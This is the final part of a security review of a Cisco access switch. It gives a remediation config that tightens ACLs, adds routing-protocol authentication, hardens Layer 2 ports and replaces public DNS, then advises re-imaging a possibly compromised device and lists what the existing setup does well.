 no ip access-group SERVER-PROTECT in
 ip access-group PCI-SEGMENT out
no ip access-list extended SERVER-PROTECT
ip access-list extended MGMT-PROTECT
 no permit tcp any any eq 22
 no permit tcp any any eq telnet
 no permit udp any any eq snmp
 no permit ip 10.10.0.0 0.0.255.255 any
 permit ip <MGMT-NET> <WILDCARD> any
 deny   ip any any log
interface Vlan1
 no ip address
 shutdown
interface Vlan10
 no ip directed-broadcast
 standby 10 authentication md5 key-string <HSRP-KEY>    ! peer in same window
interface Vlan20
 standby 20 authentication md5 key-string <HSRP-KEY>
router ospf 1
 passive-interface default
 no passive-interface GigabitEthernet1/0/47
 no default-information originate always
 default-information originate
interface GigabitEthernet1/0/47
 no crypto map BRANCH-VPN
 no ip ospf authentication-key
 ip ospf authentication message-digest
 ip ospf message-digest-key 1 md5 <OSPF-KEY>   ! or key-chain HMAC-SHA; FW in same window

! ===== 8. Layer 2  (change window) =====
vtp mode transparent
spanning-tree mode rapid-pvst
spanning-tree vlan 1-4094 root primary
spanning-tree vlan 50
spanning-tree portfast edge bpduguard default
spanning-tree loopguard default
no errdisable recovery cause all
errdisable recovery cause bpduguard
errdisable recovery cause psecure-violation
errdisable recovery interval 300
vlan 999
 name BLACKHOLE
interface range Gi1/0/33 - 38 , Gi1/0/45 - 46 , Gi1/1/1 - 2
 switchport mode access
 switchport access vlan 999
 switchport nonegotiate
 shutdown
interface range Gi1/0/1 - 16 , Gi1/0/19 - 24 , Gi1/0/27 - 30 , Gi1/0/39 - 40 , Gi1/0/48
 switchport mode access
 switchport nonegotiate
 spanning-tree portfast edge
 storm-control broadcast level 1.00
 storm-control action trap
interface range Gi1/0/4 - 5
 switchport port-security maximum 2
 switchport port-security violation restrict
 switchport port-security
interface Gi1/0/16
 switchport voice vlan 20
interface Gi1/0/27
 switchport access vlan 100            ! confirm intended VLAN
interface range Gi1/0/17 - 18
 switchport mode access
 switchport access vlan 10
 switchport voice vlan 20
 switchport nonegotiate
interface range Gi1/0/25 - 26
 no spanning-tree bpdufilter enable
 spanning-tree portfast edge trunk
 spanning-tree bpduguard enable
 switchport trunk allowed vlan <ESX-VLANS>
 switchport trunk native vlan 999
 switchport nonegotiate
interface Gi1/0/31
 switchport mode access                ! or pruned trunk if FlexConnect
 switchport nonegotiate
interface Gi1/0/32
 switchport trunk allowed vlan 40
 switchport nonegotiate
interface Gi1/0/41
 switchport access vlan <VENDOR-VLAN>
no ip arp inspection vlan 30           ! or add ARP ACL for static printers
interface Port-channel1
 ip arp inspection trust
! Po1 rebuild (IDF2 side in same window):
! default interface range Te1/1/3 - 4 ; channel-group 1 mode active ;
! Po1: switchport trunk allowed vlan <LIST> / native vlan 999 / nonegotiate

! ===== 9. Misc =====
no ip default-gateway 10.10.99.254
no ip name-server 8.8.8.8
ip name-server <INTERNAL-DNS>
end
! verify from a NEW SSH session, then: reload cancel ; write memory
```

After step 9, plan the re-image and rebuild described in C1 and H14. Hardening a switch that has been compromised doesn't remove what the attacker may have left in memory or in the image.

---

## What's done well

- The VLAN design is sensible: users, voice, printers, guest, cameras, lab, management and servers are separate VLANs with named SVIs.
- An out-of-band management interface (Gi0/0 in Mgmt-vrf) exists, even though nothing uses it yet.
- AAA is enabled with TACACS. The structure is there; it needs the `none` fallbacks removed.
- DHCP snooping is enabled on the user and voice VLANs, and the default control-plane policy (`system-cpp-policy`) is in place.
- `login on-success log` is set, and some unused ports (Gi1/0/43-44) are shut.
